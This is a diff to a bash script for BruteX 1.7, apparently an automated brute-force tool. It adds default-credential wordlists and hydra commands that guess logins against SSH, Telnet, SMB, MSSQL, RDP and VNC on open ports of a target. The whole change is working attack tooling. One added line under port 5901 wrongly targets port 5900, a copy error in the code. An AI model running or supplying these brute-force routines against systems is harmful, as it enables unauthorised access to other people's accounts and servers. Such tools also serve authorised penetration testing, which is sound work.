@@ -20,13 +20,18 @@ PORT="$2"
 VER="1.7"
 LOOT_DIR=/usr/share/brutex/loot
 FTP_USER_PASS="/usr/share/brutex/wordlists/ftp-default-userpass.txt"
-MYSQL_USER_PASS="/usr/share/brutex/wordlists/mssql-default-userpass.txt"
+SSH_USER_PASS="/usr/share/brutex/wordlists/ssh-default-userpass.txt"
+TELNET_USER_PASS="/usr/share/brutex/wordlists/telnet-default-userpass.txt"
+MSSQL_USER_PASS="/usr/share/brutex/wordlists/mssql-default-userpass.txt"
+MYSQL_USER_PASS="/usr/share/brutex/wordlists/mysql-default-userpass.txt"
 ORACLE_USER_PASS="/usr/share/brutex/wordlists/oracle-default-userpass.txt"
 POSTGRES_USER_PASS="/usr/share/brutex/wordlists/postgres-default-userpass.txt"
 WINDOWS_USER_LIST="/usr/share/brutex/wordlists/windows-users.txt"
+WINDOWS_USER_PASS="/usr/share/brutex/wordlists/windows-default-userpass.txt"
 USER_FILE="/usr/share/brutex/wordlists/simple-users.txt"
 PASS_FILE="/usr/share/brutex/wordlists/password.lst"
 SNMP_FILE="/usr/share/brutex/wordlists/snmp-strings.txt"
+VNC_FILE="/usr/share/brutex/wordlists/vnc-default-passwords.txt"
 HTTP_LOCATION="/"
 THREADS="1"
 COLOR1='\033[91m'
@@ -115,6 +120,7 @@ then
 	echo -e "$COLOR1 + -- --=[Port 22 closed... skipping.$RESET"
 else
 	echo -e "$COLOR2 + -- --=[Port 22 opened... running tests...$RESET"
+	hydra -C $SSH_USER_PASS $TARGET ssh -t $THREADS -e ns
 	hydra -L $USER_FILE -P $PASS_FILE $TARGET ssh -t $THREADS -e ns
 fi
 
@@ -123,6 +129,7 @@ then
 	echo -e "$COLOR1 + -- --=[Port 23 closed... skipping.$RESET"
 else
 	echo -e "$COLOR2 + -- --=[Port 23 opened... running tests...$RESET"
+	hydra -C $TELNET_USER_PASS $TARGET telnet -t $THREADS -e ns
 	hydra -L $USER_FILE -P $PASS_FILE $TARGET telnet -t $THREADS -e ns
 fi
 
@@ -189,6 +196,7 @@ then
 	echo -e "$COLOR1 + -- --=[Port 445 closed... skipping.$RESET"
 else
 	echo -e "$COLOR2 + -- --=[Port 445 opened... running tests...$RESET"
+	hydra -C $WINDOWS_USER_PASS $TARGET smb -S 445 -t $THREADS -e ns
 	hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $TARGET smb -S 445 -t $THREADS -e ns 
 fi
 
@@ -229,6 +237,7 @@ then
 	echo -e "$COLOR1 + -- --=[Port 1433 closed... skipping.$RESET"
 else
 	echo -e "$COLOR2 + -- --=[Port 1433 opened... running tests...$RESET"
+	hydra -C $MSSQL_USER_PASS $TARGET mssql -S 1433 -t $THREADS -e ns
 	hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $TARGET mssql -S 1433 -t $THREADS -e ns 
 fi
 
@@ -253,6 +262,7 @@ then
 	echo -e "$COLOR1 + -- --=[Port 3389 closed... skipping.$RESET"
 else
 	echo -e "$COLOR2 + -- --=[Port 3389 opened... running tests...$RESET"
+	hydra -C $WINDOWS_USER_PASS $TARGET rdp -t $THREADS -e ns
 	hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $TARGET rdp -t $THREADS -e ns
 fi
 
@@ -269,6 +279,7 @@ then
 	echo -e "$COLOR1 + -- --=[Port 5900 closed... skipping.$RESET"
 else
 	echo -e "$COLOR2 + -- --=[Port 5900 opened... running tests...$RESET"
+	hydra -P $VNC_FILE $TARGET vnc -S 5900 -t $THREADS -e ns
 	hydra -P $PASS_FILE $TARGET vnc -S 5900 -t $THREADS -e ns
 fi
 
@@ -277,6 +288,7 @@ then
 	echo -e "$COLOR1 + -- --=[Port 5901 closed... skipping.$RESET"
 else
 	echo -e "$COLOR2 + -- --=[Port 5901 opened... running tests...$RESET"
+	hydra -P $VNC_FILE $TARGET vnc -S 5900 -t $THREADS -e ns
 	hydra -P $PASS_FILE $TARGET vnc -S 5901 -t $THREADS -e ns
 fi
 
